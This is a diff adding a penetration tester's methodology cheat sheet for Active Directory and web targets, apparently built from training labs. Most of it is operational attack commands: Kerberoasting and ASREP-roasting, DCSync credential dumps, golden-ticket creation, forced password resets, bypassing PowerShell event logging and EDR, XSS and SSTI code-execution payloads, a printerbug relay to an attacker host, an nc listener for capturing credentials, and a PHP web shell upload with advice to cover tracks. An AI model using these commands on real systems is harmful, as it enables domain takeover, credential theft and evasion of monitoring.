+						Get-ADTrust -Filter *
+						Get-ADGroup -Filter * | select name
+						Get-ADGroup -Identity "Backup Operators" 
+							-Gets details on Group name
+						Get-ADGroupMember -Identity "Backup Operators"
+							-Lists members of the group
+						Get-ADGroupMember -Identity "GroupName" | Where-Object {$_.objectClass -eq "group"}
+							-Shows groups that are nested within 'GroupName' group
+							-rights are usually inherited
+
+						Automated Process to determine if current user has admin access to computer:
+						----------------------------------------------------------------------------
+						-Get-ADComputer -filter * | select Name > compnames.txt
+						$compnames=(Get-Content ./compnames.txt).Trim()
+						Foreach($Line in $compnames){Test-AdminAccess -ComputerName $Line >> am_I_admin.txt}
+
+						Automated Process to find Local Admins that are Domain Users:
+						-------------------------------------------------------------
+						Get-ADGroupMember -Identity 'Local Admins' | select SamAccountName > file.txt
+						$la=(Get-Content .\file.txt).Trim()
+						foreach($line in $la){Get-ADUser -Identity $line -Properties * | Where-Object {$_.PrimaryGroup -like 
+						"*Domain Users*"} | select SamAccountName}
+
+						PowerView
+						---------
+						Get-DomainGroupMember Identity "GroupName" -Recurse
+							-find nested groups in GroupName
+						Get-DomainTrustMapping
+						Test-AdminAccess -ComputerName 'compName'
+							-Tests if current user is admin at computer
+
+						Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+							-Look for Kerberoastable accounts
+
+						SharpView(.NET port of PowerView); good for evasion when powershell is constrained:
+						-----------------------------------------------------------------------------------
+						.\SharpView.exe Get-DomainGroupMember -Identity "Domain Admins" -Recurse $true
+						.\SharpView.exe Get-DomainTrustMapping -NET\|-API
+
+						Snaffler
+						--------
+						Enumerates shares within domain
+						Must be run on a domain joined host or from a domain-user context
+
+						SharpHound
+						----------
+						Must be run on a domain joined host or from a domain-user context
+
+		6.) BloodHound:			If enumerating from within target private network, add DNS for DOMAIN to resolve.conf:
+						--------------------------------------------------------------------------------------
+						See 'Adding_DOMAIN_DNS_to_resolve.conf.png'
+
+						ALL must be done for EACH Domain found.
+						
+						Gathering info:
+						---------------
+						Run SharpHound on windows || run bloodhound-python from linux host
+
+						sudo bloodhound-python -u user -p pass -ns nameserver -d domain.local -c all
+							-generates json files that can be loaded into bloodhound
+
+						bloodhound-python -d DOMAIN.LOCAL -dc HOST.DOMAIN.LOCAL -c All -u user@domain.local -p pass
+							-gather data on ANOTHER Domain via trusts
+
+						SharpHound.exe -c ALL --zipfilename filename
+
+						Pre-Built Queries To Note
+						-------------------------
+						Find Computers where Domain Users are Local Admin
+							-Can access host with admin privs to dump hashes
+						Find Computers with Unsupported Operating Systems
+							-May have CVEs like MS08-067 and Eternal Blue
+
+		7.)Living off the Land		LOtL Commands for windows environment/Firewall Enumeration:
+						-----------------------------------------------------------
+						hostname ---> shows PC name
+						[System.Environment]::OSVersion.Version ---> shows OS version and revision level
+						wmic qfe get ---> shows hotfixes/patches
+						Get-ChildItem Env: | ft Key,Value <--- shows environment values like keys
+						
+						for cmd.exe
+						-----------
+						set %USERDOMAIN% ---> shows domain name to which host belongs
+						set %logonserver%---> shows DC the host authenticates to
+
+						Downgrade to lower version of powershell(<3) in order to bypass event logging
+						----------------------------------------------------------------------------
+						get-host	<--- shows current PS version
+						powershell.exe -version 2
+
+						Can check event viewer if possible to verify if logs are still being written or not
+						-----------------------------------------------------------------------------------
+						Applications and Services Logs > Microsoft > Windows > Powershell > Operational
+
+						Unregister Powershell event provider:
+						-------------------------------------
+						$PSHOME\RegisterManifest.ps1 -Unregister
+
+						Check Firewall Profiles(Domain/Private/Public):
+						-----------------------------------------------
+						netsh advfirewall show allprofiles
+
+						Check windows defender from cmd.exe:
+						------------------------------------
+						sc query windefend
+
+						Check if anyone else is logged in:
+						----------------------------------
+						qwinsta
+
+						wmic qfe get Caption,Description,HotFixID,InstalledOn <--- shows patch level with description
+						wmic computer system get Name,Domain,Manufacturer,Model,Username,Roles /format:List <--- basic host info
+						wmic process list /format:list <--- lists ALL processes on host
+						wmic ntdomain list /format:list <--- shows info about Domain and DC
+						wmic useraccount list /format:list <--- info on local accounts and any logged in domain accounts
+						wmic group list /format:list <--- info on local groups
+						wmic sysaccount list /format:list	<--- shows info on system accounts being used as service accounts
+						wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress <---DC/Forest info
+
+						NET commands are monitored by EDR solutions!
+						--------------------------------------------
+						net localgroup Administrators <--- shows domain users that are apart of the local admin group for target
+										   machine
+						"net1" may bypass EDR
+
+						Dsquery:
+						--------
+						Requires elevated privileges or a cmd.exe/PS session in context of SYSTEM
+						Makes LDAP queries
+						https://ldap.com/ldap-oid-reference-guide/
+
+						dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+							-looks for all domain controllers
+
+						dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=
+						32))" -attr distinguishedName userAccountControl
+							-Searches for users with 'PASSWD_NOTREQD' attribute set
+						
+		8.) Kerberoasting		Verify Encryption Types of SPNs(requires PowerView):
+						----------------------------------------------------
+						Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+						
+						Check encryption type #'s here:
+						-------------------------------
+						https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-
+						supported-kerberos-encryption-types/ba-p/1628797
+
+						Check/Change GPO via GUI/Desktop to bypass AES128/256 encryption on Server 2019 and >
+						-------------------------------------------------------------------------------------
+						Computer Configuration > Policies > Windows Settings > Security Settings > Local Polices > Security Options
+							-Network security: Configure encryption types allowed for Kerberos
+
+						Get SPNs of accounts that have admin privs:
+						-------------------------------------------
+						get-aduser -filter {AdminCount -eq 1} -Properties * | Where-Object {$_.ServicePrincipalname -notlike "{}"} 
+						| select samaccountname
+
+						Impacket
+						--------
+						Impacket-GetUserSPNs -dc-ip IP domain.local/user 	<---requests list of SPNs
+							.-request 					<---requests TGS containing NTLMv2 hash for * SPNs
+							.-request-user					<---requests TGS of specified user
+						Crack NTLMv2 Hash
+
+						Manual Method from Windows:
+						---------------------------
+						setspn.exe -Q */*	<--- find SPNs
+						Add-Type -AssemblyName System.IdentityModel
+						New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "protocol/domain.local"
+						.\mimikatz.exe
+						base64 /out:true
+						kerberos::list /export
+
+						W/ PowerView.ps1:
+						-----------------
+						Get-AdUser -filter * -properties * | Where-Object {$_.ServicePrincipalNames -NotLike "{}"} | select
+						SamAccountName
+
+						Pick a SPN from that list to target Individual users
+
+						Get-DomainUser -Identity user | Get-DomainSPNTicket -Format Hashcat
+
+						Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat 	<--- dumps ALL NTLMv2 hashes from TGSs
+
+							Can Pipe through command to write to csv file:
+							----------------------------------------------
+							| Export-Csv .\file.csv -NoTypeInformation
+
+						With Rubeus:
+						------------
+						.\Rubeus.exe kerberoast /stats <--- shows LDAP query made, Accepted Encryption types, etc
+						.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap	<---Extracts NTLMv2 hashes from TGSs
+														    meeting attribute
+						.\Rubeus.exe kerberoast /tgtdeleg /user:username /nowrap	<---specify user and enc Type
+
+						Manually Register/DeRegister a user with SPN
+						---------------------------------
+						setspn.exe -A protocol/domain.local username
+							-D flag will remove this registration
+
+		9.) DACL Abuse			DACLAbuse.jpeg
+
+						Selective ACL enumeration:
+						--------------------------
+						Pick a user
+
+						Get-ADUser -filter * | Select-Object -ExpandProperty SamAccountName > adusers.txt
+
+						foreach($line in [System.IO.File]::ReadLines("C:\PathTo_adusers.txt")) {Get-Acl "AD:\$(Get-ADUser $line)" 
+						| Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'DOMAIN\\user'}}
+							-attains a list of ACLs in which an ACE is associated with the target 'user'
+							-'ObjectType' has the GUID describing the Access level/type user has over the principal
+
+							Translate ObjectType:
+							---------------------
+							$guid= ""
+
+							Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter
+							{ObjectClass -Like 'ControlAccessRight'} -Properties * | select Name,DisplayName,DistinguishedName,
+							rightsGuid | ? {$_.rightsGuid -eq $guid} | fl
+
+						Rinse and repeat for each user found that is accessible from target user in order to determine if the
+						principal has any interesting ACEs in another ACL
+
+						With PowerView:
+						---------------
+						$sid="SID of target user"
+						Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+		10.)'Force Password Change' 	ACE abuse:
+
+						PS Credential Object of user with 'Force Password change' over target user:
+						---------------------------------------------------------------------------
+						$sec=ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+						$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
+
+						Create SecureString Object:
+						---------------------------
+						$userpass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+						Import Powerview
+
+						Change vulnerable users password:
+						---------------------------------
+						Set-DomainUserPassword -Identity target_user -AccountPassword $userpass -Credential $Cred -Verbose
+
+		11.) Segway to SPN attack	PSCredential Object of targetuser if he can register users to a SPN:
+						--------------------------------------------------------------------
+						$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+						$Cred2 = New-Object System.Management.Automation.PSCredential('domain\target_user', $SecPassword)
+
+						If targetuser has write ACEs to a group principal and needs said groups rights to perform an attack:
+						----------------------------------------------------------------------------------------------------
+						Add-DomainGroupMember -Identity 'groupName' -Members 'targetuser' -Credential $Cred2 -Verbose
+
+						Set SPN to user2 that targetuser has 'write' rights over:
+						---------------------------------------------------------
+						Set-DomainObject -Credential $Cred2 -Identity user2 -SET @{serviceprincipalname='cifs/domain.el'} -Verbose
+
+						Perform Kerberoasting to acquire NTLMv2 hash for cracking.
+
+						Cleanup:
+						--------
+						Set-DomainObject -Credential $Cred2 -Identity user2 -Clear serviceprincipalname -Verbose
+							-may need to log in as targetuser and deregister SPN with setspn.exe
+
+						Remove-DomainGroupMember -Identity "groupName" -Members 'targetuse' -Credential $Cred2 -Verbose
+
+						Notify client if a password needs to changed back.
+
+						Using 'targetedKerberoast.py' script to automate:
+						-------------------------------------------------
+						./targetedKerberoast.py -d dbo.local -u [user_able_to_create_SPNs] -p pass --dc-ip IP -v
+
+		12.) DCSYNC			Enumerate Users who have "Replicating Directory Changes (ALL)" permissions:
+						---------------------------------------------------------------------------
+						Get SID of user
+						Load PowerView
+
+						$sid='sid of user'
+
+						Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} 
+						| ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, 
+						ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+							-any responses are a green light to the user having the abililty to perform a DCSYNC attack
+
+						Enumerate ALL groups to find one with "Replicating Directory Changes" permission:
+						---------------------------------------------------------------------------------
+						foreach($line in [System.IO.File]::ReadLines("C:\Users\Administrator\adgroupsid.txt")){Get-ObjectAcl 
+						"DC=dbo,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get'} 
+						| ? {$_.SecurityIdentifier -match $line} | select AceQualifier,ObjectDN,ActiveDirectoryRights,
+						SecurityIdentifier,ObjectAceType | fl}
+
+						Perform DCSYNC attack, copying NTLM hashes and outputing on local file via remote linux:
+						----------------------------------------------------------------------------------------
+						impacket-secretsdump.py -outputfile hashes.file -just-dc INLANEFREIGHT/user@IP
+							-just-dc-user <USERNAME>	<---extracts data on specified user
+							-pwd-last-set			<---see when each account password was last changed
+							-user-status			<---check if user is disabled
+
+		13.) Write DACLs		When user has Write DACL privileges on Groups/Users that can perform DCSYNC:
+						----------------------------------------------------------------------------
+
+							Add the ability to add yourself to the group:
+							---------------------------------------------
+							Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers
+
+							Grant full control to DCSYNC-able user > Change password on user:
+							-----------------------------------------------------------------
+							Add-DomainObjectAcl -TargetIdentity user -Rights All
+
+							Grant full control over Computer object > Read LAPS:
+							----------------------------------------------------
+							Add-DomainObjectAcl -TargetIdentity computerName -Rights All
+
+							Grant DCSYNC rights over Domain:
+							--------------------------------
+							Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
+
+							Grant full control over a GPO:
+							------------------------------
+							Add-DomainObjectAcl -TargetIdentity TestGPO -Rights All
+
+							Grant full control over OU > Add a new ACE to OU that inherits down to child objects:
+							-------------------------------------------------------------------------------------
+							Add-DomainObjectAcl -TargetIdentity (OU GUID) -Rights All
+
+		14.) Reverseable Encryption	Getting cleartext passwords through DCSYNC
+						
+						Enum users who have UAC bit value 128; "Store Password Using Reversible Encryption":
+						------------------------------------------------------------------------------------
+						Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+						With PowerView:
+						---------------
+						Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} 
+						| select samaccountname,useraccountcontrol
+
+						Mimikatz can dump these with dcsync option:
+						-------------------------------------------
+						lsadump::dcsync /domain:domain.local /user:domain\user
+
+		15.) Access to other Hosts	Finding access to workstations and servers via RDP/WinRM with a Domain User:
+						----------------------------------------------------------------------
+						Use Bloodhound
+
+						With PowerView:
+						---------------
+						Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+						Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+
+						Manually grabbing Remote Management Users from Computers on Domain:
+						-------------------------------------------------------------------
+						foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Documents\adcomp.txt"))
+						{Get-NetLocalGroupMember -ComputerName $line -GroupName "Remote Management Users"}
+						
+						Bloodhound query to find users with remote access to computers:
+						---------------------------------------------------------------
+						MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]
+						->(c:Computer) RETURN p2
+
+		16.) MSSQL Server Admin		Searching for SQL server admin from Bloodhound:
+						-----------------------------------------------
+						MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->
+						(c:Computer) RETURN p2
+
+						Using PowerUpSQL:
+						-----------------
+						https://github.com/NetSPI/PowerUpSQL
+						https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin
+
+						Perform Remote Queries:
+						-----------------------
+						Get-SQLQuery -Verbose -Instance "IP,port" -username "domain\user" -password "password123" -query ''
+
+		17.) DoubleHop Problem		Avoid netsh if possible to pivot from attack host to deeper hosts.
+						TRY using CHISEL; This didn't give me limitations with pivoting and TGTs
+						If this can NOT be avoided, do the following:
+
+						Example from evil-winrm:
+						------------------------
+						Create PS credential, then use that to perform commands with PowerView.
+						Get-domainuser -spn -credential $cred
+
+						Example from windows:
+						---------------------
+						Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential domain\user
+							-requires Admin privileges(elevated shell;)
+							-requires standard protocol via WinRM; NOT Evil-Winrm because a password prompt may be required
+								.via and RDP pivothost
+						Restart-Service WinRM
+						Enter-PSSession -ComputerName name -Credential domain\user -ConfigurationName  backupadmsess
+
+		18.) Misc Misconfigs		Windows Exchange:
+						-----------------
+						https://github.com/gdedrouas/Exchange-AD-Privesc
+							-Contains info on Exchange Windows groups
+							-Also see 'AD_Groups_to_watch_for.txt'
+
+						https://github.com/dirkjanm/PrivExchange
+							-Privexchange
+								.Requires Domain user credentials
+								.https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ <---steps
+						
+						The Printer Bug:
+						----------------
+						https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+						Also see 'The Printer Bug' in Resources
+						Import-Module .\SecurityAssessment.ps1
+						Get-SpoolStatus -ComputerName DC01.DOMAIN.LOCAL
+							-If true, then vulnerable
+
+						rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'	
+
+							Performing attack without creds:
+							--------------------------------
+							ntlmrelayx.py -t smb://target -socks
+							proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
+
+						MS14-068 - Flaw in Kerberos Protocol:
+						-------------------------------------
+						Allows Forged PACs(Privilege Attribute Certificates) to be accepted by KDC.
+							
+							Exploit with:
+							-------------
+							https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+						
+						Sniffing LDAP Creds:
+						--------------------
+						https://grimhacker.com/2018/03/09/just-a-printer/
+							-Default Creds:
+								.1234567812345678
+								.12345678
+							-Change LDAP IP to attacker controlled ldap server using netcat
+								.sudo nc -lvpk 386 <--- maybe 389
+							-'Test Connection' function should show cleartext user/password
+							-If this does NOT work, console the link above for setting up a FULL LDAP server
+
+						DNS Records:
+						------------
+
+							Remotely query DNS records from linux:
+							--------------------------------------
+							https://github.com/dirkjanm/adidnsdump
+							python3 dnsdump.py -u DBO\\user ldap://DC_IP -r
+								-writes a csv file with DNS record info
+
+						Check Description Fields for leaked information:
+						------------------------------------------------
+						Get-ADUser -Filter * -properties * | Select-Object samaccountname,description
+						| Where-Object {$_.Description -ne $null}
+
+						Check if PASSWD_NOTREQD Account Attribute is set:
+						-------------------------------------------------
+						dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=32)"  -attr sAMAccountName
+
+						Check SYSVOL share for scripts:
+						-------------------------------
+						ls \\DC01\SYSVOL\
+
+						Group Policy Preferences(GPP) Passwords(MS14-025):
+						--------------------------------------------------
+						Located in SYSVOL share
+
+						Import-Module Get-GPPPassword.ps1
+							-Get-GPPPassword
+								.searches for Preference files
+
+						gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+							-decrypt passwords found in GPP xml files
+							-cpassword attribute id AES256 bit encrypted
+
+						crackmapexec smb -L | grep gpp
+							-lists gpp modules
+
+						crackmapexec smb IP -u user -p password -M gpp_autologin
+							-Registry.xml files hold passwords for hosts with autologin enabled
+								.can be set via GPO
+						
+						ASREP-Roasting:
+						---------------
+
+							Check for 'Do not require Kerberos pre-authentication'; PowerView:
+							------------------------------------------------------------------
+							Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+							Manual Enum:
+							------------
+							dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" -attr sAMAccountName
+
+							Rubeus:
+							-------
+							.\Rubeus.exe asreproast /user:user /nowrap /format:hashcat
+
+							Kerbrute:
+							---------
+							Automatically checks for ASREPable users
+
+							GetNPUsers python script:
+							-------------------------
+							GetNPUsers.py DOMAIN.LOCAL/ -dc-ip IP -no-pass -usersfile valid_ad_users.file
+
+		19.) GPO ENUM			GPO location in \\DC01\SYSVOL\..\Policies	
+						Get-GPO -All
+
+						With PowerView:
+						---------------
+						Get-DomainGPO
+
+						Enumerate GPO ACL:
+						------------------
+						$sid=Convert-NameToSid "Domain Users"
+						Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+
+						Scripts and binaries:
+						---------------------
+						https://github.com/sense-of-security/ADRecon
+						https://github.com/Group3r/Group3r
+
+		20.) GPO Abuse			https://github.com/Hackndo/pyGPOAbuse
+						https://github.com/FSecureLABS/SharpGPOAbuse
+
+		21.) Trusts from Windows	Get-ADTrust -Filter *
+
+						PowerView:
+						----------
+						Get-DomainTrust
+						Get-DomainTrustMapping
+
+						Use Bloodhound
+
+						ExtraSids Attack-Mimikatz:
+						--------------------------
+						lsadump::dcsync /user:LOGISTICS\krbtgt <--- Note NTLM, and ALL keys!
+						Get-ADDomain | Select-Object DomainSID <--- Note SID for CURRENT compromised domain!
+							-PowerView:
+							-----------
+							Get-DomainSID
+						Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+							-Requires PowerView
+						Note FQDN of current compromised domain!
+						Conjure a fake user name(NO NEED TO CREATE USER!!!)
+
+						Create Golden Ticket w/ mimi:
+						-----------------------------
+						kerberos::golden /user:hacker /domain:SUB.DOMAIN.LOCAL /sid:[SID of current domain] /krbtgt:[NTLM] 
+						/sids:[SID of group] /ptt
+
+						Create Golden Ticket w/ Rubeus:
+						-------------------------------
+						.\Rubeus.exe golden /rc4|/aes128|/aes256:[key] /domain:SUB.DOMAIN.LOCAL /sid:[current domain SID]  
+						/sids:[Group SID] /user:hacker /ptt
+
+		22.) Trusts from Linux		ExtraSids Attack from Linux w/ Impacket:
+						----------------------------------------
+						Same information is required as Mimikatz ExtraSids attack
+
+						impacket-secretsdump FQDN/user@IP_of_FQDN -just-dc-user DOMAIN/krbtgt
+							-Acquire NTLM of krbtgt
+						
+						impacket-lookupsid FQDN/user@IP_of_FQDN
+							-Acquire SID of compromised domain
+
+						impacket-lookupsid FQDN/user@Target_domain_IP | tee -a TargetDomain_SIDs_ofGroups.txt
+
+						Conjure a username like with mimikatz(no need to create one manually)
+
+						Create Golden ticket w/ impacket:
+						---------------------------------
+						impacket-ticketer -nthash [krbtgt ntlm hash] -domain Compromised_Domains_FQDN -domain-sid 
+						[SID of said domain] -extra-sid [enterprise admins SID] fake_username
+							-should recieve a ccache file for fake user
+
+						Import ccache via KRB5CCNAME
+
+						Can gain SYSTEM access to DC via psexec || DCSYNC for other user NTLM hashes and keys
+						
+		23.) Cross-Forest Enum		Searching for SPNs:
+						-------------------
+						Get-ADUser -Filter * -Properties Srvice PrincipalName -Server Target-Domain | select SamAccountName
+							-PowerView:
+								Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+						Check Membership of user accross trust:
+						---------------------------------------
+						Get-ADUser -Identity SAMname -Properties memberOf -Server Target-Domain
+							-PowerView:
+								Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc 
+								| select samaccountname,memberof
+
+						Kerberoasting accross trust with Rubeus:
+						----------------------------------------
+						.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+						Checking cross trust group membership by SID:
+						---------------------------------------------
+						Get-AdGroup Identity groupname -Propterties * -Server Target-Domain | select members
+							-If an SID is shown, compare to Target-Domain SID
+								.If NO match, then that user is apart of another Domain ---> has access to target via grp
+							-PowerView:
+								Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+						Convert SID to Username:
+						------------------------
+							$SID ='S-1-5-21-1924530255-1943933946-939161726-500'
+							$objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
+							$objUser = $objSID.Translate([System.Security.Principal.NTAccount])
+							Write-Host "Resolved user name: " $objUser.Value
+								-PowerView:
+									Convert-SidToName [SID]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+II. Enumerating Website/Server 
+	A. If port is known(http/https) then
+		1. nmap --script vuln
+						will look for list of CVEs;
+						may also expost important files and paths
+							.i.e. robots.txt, XML files
+		2. whatweb
+						look for vulnerablities such as; weak code(ctrlU); take note
+
+	B. For IIS(.NET), HTTP, HTTPS Services:
+		1. VHOST Enum			
+						Utilize Vhost script in Documents/Scripts/Enum*/OSINT
+							.Create a list of potential vhosts to check
+							.Do this for each IP
+		2. ffuf 
+						if not code 403(forbidden) , look at html under other paths(ctrl+U)
+							-keep eye out for green text in code
+						if more paths found, access their code via webbrowser as afformentioned
+						if password/user info found, note it.
+						if cookies found, try to pass in forbidden areas
+						flag
+							-ic ---> ignores wordlist comments
+							-t  ---> set speed of requests via threads used
+
+						The following is a methodology:
+
+						Find extentions:
+						To fuzz extentions used by web app using common file 'index':
+						-------------------------------------------------------------
+						$ff = /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extentions.txt
+						ffuf -w $ff -u [url]/indexFUZZ -ic
+
+
+						Fuzz recursively:
+						-----------------
+						ffuf -w $ff -u [url]/FUZZ -recursion -recursion-depth 1 -v -e [.file_extention]
+							-v ---> prints FULL url
+							-e ---> file extention to suffix
+
+						Vhost Fuzzing:
+						--------------
+						ffuf -w $ff -u [url] -H 'Host: FUZZ.website.com'
+							-use Seclists/Discovery/DNS lists
+							-consider adding the vhost to /etc/hosts in order to fuzz; must include subdomain prefix(s)
+								.check old files to see if the vhost is in the same folder
+
+						To fuzz multiple wordlists:
+						---------------------------
+						ffuf -w $ff:FUZZ_1 -w $ff2:FUZZ_2 -u [url]/FUZZ_1.FUZZ_2 -ic -fc 404,403
+
+				
+						Filter the most common length:
+						------------------------------
+						ffuf -w $ff -u [url]/FUZZ -fs int ---> where int is the COMMON size as mentioned above
+
+							-Consider Size length when recieving MANY code 200 responses. Run scan that gives all these 
+							 responses in order to establish a 'base line'
+
+						Fuzzing URL Parameters
+						----------------------
+						ffuf -w $ff -u [url]/search?FUZZ=key -ic
+
+							-Fuzzing URL paramaters denoted with ? i.e. www.john.rip/search?query=key, where 'query' is the 
+							 'parameter'
+							-Use SecLists/Discovery/Web-Content/burp-parameter-names.txt
+
+						Fuzzing key parameters with POST requests:
+						------------------------------------------
+						ffuf -w $ff -u [url] -X POST -d 'FUZZ=key' -H 'Content Type: application/x-www-form-urlencoded'
+
+						Fuzzing KEY parameter values:
+						----------------------------
+						ffuf -w keyparams.txt -u [url] -X POST -d 'id=FUZZ' -H 'Content Type: application/x-www-form-urlencoded'
+
+						May need a custom wordlist containing key values
+						Can use numbers:
+							for i in (seq 1 1000); do echo $i >> keyparams.txt; done
+
+
+
+
+	C. cURL
+		1. webpage code pipes:		Pipe into these depending on response format:
+							-xml	xmllint  --format -
+							-java	jq
+
+	D. SENSITIVE DATA EXPOSURE 		https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+						Keep an eye out for the following:
+
+		1. user names i.e. admin
+
+		2. possible passwords
+						email could be actual PW
+						look for words that look unique and show up multiple times in strange places.
+
+		3. read me files
+						might have versions of services
+
+		4. If webserver utilizes:	password lockout feature
+							-if YES, do NOT use bruteforcing for password
+
+		5. admin login portal
+						may be .php
+
+		6. config files
+						possible usernames, emails, unique words might be passwords
+						.ini files
+						password HASH might be located in shadow.php
+
+		8. Keep an eye out for:		upload features 
+							-might need admin credentials
+							-via plugins
+							-consider using this for ideas:
+								.https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+							-if found, go to III.A.2.uses API?
+
+		9. Unrestricted Path Traversal		Munipulate requested path in url to try to get files in system directories i.e. /../../etc/passwd
+							Examples:
+								-Grafana CVE-2021-43798
+							May also check by adding extra forward slash i.e. //etc/passwd
+			
+
+	E. XSS, SSTI Checks
+                1. Check for filtering		If vulnerable input field is GET request, then payload may be placed in URL
+						'#' in URL next to input parameter my indicate client side processing aka DOM-based-XSS potential
+
+						SSTI
+						----
+						${7*7}
+						$ can be replaced with * <--- might bypass filtering
+						See 'SSTI_Methodology.png'
+
+						See 'Payloads/Web' for payloads that worked in the past and examples
+
+						See 'SSTI/ssti-payload' for java SSTI payload generator
+
+						XSS DOM-Attack; bypassing 'script' blocker
+						------------------------------------------
+						#"><img src=/ onerror=alert(document.cookie)>
+                		 			-Should show cookie value for current user
+
+						<img src="" onerror=alert(document.cookie)>
+							-can also use 'window.origin'
+
+						XSS various payloads:
+						---------------------
+						<script>alert(window.origin)</script>
+							-Shows where this input is being executed
+
+						<plaintext>
+							-Displays all subsequent HTML in plaintext on page, instead of rendering 
+
+						<script>print()</script>
+							-Initiates browser print dialogue
+
+						<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
+
+						<a href="http://www.hackthebox.com">Click Me</a> <--- This will create a link to what's in the quotes
+
+		3. Flask Framework		Try the following to check for Server Side Template Injection:		
+						https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
+							{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+						See SSTI folder in Scripts for python text to image creator
+
+		4. Note:			If a search is explicitly filtered(see RedPanda) perhaps try a wildcard to take place of banned character
+							-See SSTI methodology picture in Resources directory
+			
+	F. Cookie Enumeration			Use Burp
+						Change decoded text from cookie to try to escalate privileges
+	                                                -change username to admin, 'is_admin':true
+
+	G. Web Proxy Techs			MSFConsole
+						auxiliary/scanner/http/robots_txt ---> can use proxy option
+						auxiliary/scanner/http/http_put   ---> can use proxy option
+							-checks to see if files and be uploaded/deleted to target web app
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+III. Exploitation/Post-Exploitation
+	A. Attack surface
+
+		1. Public Facing Services	Determine service version; capture banner
+						Attempt to access anonymously
+						Attempt to access with default creds
+						which port?
+						whats the service version?
+						exploitable?
+
+		2.) Consider:			Default configurations of service(google)
+						Other ports used by service
+						How the service handles errors
+						Service privileges
+						https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+						https://owasp.org/Top10/
+
+		3.) Website
+				
+						look for plugin allowing upload of file or image
+						upload following code in a php file	<?php system('id'); ?>
+							**NOTE THIS IS EASILY DETECTABLE; ALWAYS COVER YOUR TRACKS! DELETE CODE WHEN DONE!**
+						verify file uploaded by searching directories :
+							-'image'
+							-'content'
+						curl the path to the file/image uploaded, if the following response is given, then we most likely have 
+						remote code access
